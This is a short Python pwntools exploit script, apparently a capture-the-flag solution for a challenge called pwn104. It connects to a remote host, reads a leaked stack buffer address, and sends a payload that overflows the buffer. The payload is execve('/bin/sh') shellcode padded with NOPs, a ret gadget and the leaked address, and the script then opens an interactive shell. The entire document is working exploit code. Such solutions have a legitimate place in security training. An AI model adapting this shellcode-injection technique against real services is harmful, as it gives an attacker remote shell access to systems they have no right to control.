from pwn import *

elf = context.binary = ELF('./pwn104-1644300377109.pwn104')
context.log_level = 'debug'

io = remote('10.10.214.74', 9004)

offset = 80
ret = 0x401016

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

io.recvuntil(b"I'm waiting for you at ")
buffer_address = int(io.recvline(), 16)
log.success(f"Leaked address: {hex(buffer_address)}")


### USING LJUST FOR AUTO

# payload = flat(
# 	shellcode.ljust(offset, asm('nop')),
# 	ret,
# 	buffer_address
# )


### MANUAL

diff = offset - len(shellcode)

payload = flat(
	shellcode,
	asm('nop') * diff,
	ret,
	buffer_address
)

io.sendline(payload)
io.interactive()